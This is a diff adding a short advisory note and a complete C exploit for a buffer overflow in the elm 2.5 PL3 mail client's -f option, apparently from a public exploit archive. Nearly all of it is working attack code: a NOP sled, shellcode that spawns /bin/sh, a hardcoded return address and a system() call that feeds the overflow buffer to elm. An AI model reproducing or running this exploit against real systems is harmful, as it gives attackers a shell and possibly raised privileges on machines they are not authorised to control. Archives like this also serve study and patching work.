@@ -1,0 +1,54 @@
+source: http://www.securityfocus.com/bid/2403/info
+
+There is a buffer overflow in elm 2.5 PL3. This overflow is accessible by passing a long string to the -f (Alternative-Folder) command-line option. This vulnerability may not be restricted to this version of elm. 
+
+/***
+    -------------
+    elm253-exploit.c
+    -------------
+***/
+
+#include <stdlib.h>
+
+#define NOP 0x90
+#define LEN 356
+#define OFFSET 0
+#define RET 0xbffffa64
+
+unsigned long dame_sp() {
+        __asm__("movl %esp,%eax");
+}
+
+void main() {
+
+        static char shellcode[]=
+/* "\x31\xc0"   */              /* xorl %eax,%eax        */
+/* "\x31\xdb"   */              /* xorl %ebx,%ebx        */
+/* "\xb0\x17"   */              /* movb $0x17,%al        */
+/* "\xcd\x80"   */              /* int $0x80             */
+"\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"
+"\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";
+
+        int i=0;
+        int cont=0;
+        char buffer[LEN+4];
+        char kid[6+LEN+4];
+
+        printf("-------------------------------------\n");
+        printf("elm buffer overflow exploit by _kiss_\n");
+        printf("-------------------------------------\n");
+
+        for (i=0;i<=LEN;i+=4)
+                *(long *) &buffer[i] = RET;
+
+        for (i=0;i<LEN-strlen(shellcode)-100;i++)
+                buffer[i]=NOP;
+
+        for (i=LEN-strlen(shellcode)-100;i<LEN-100;i++)
+                buffer[i]=shellcode[cont++];
+
+        strcpy(kid,"KID=");
+        strcat(kid,buffer);
+        putenv(kid);
+        system("/usr/local/bin/elm -f $KID");
+}
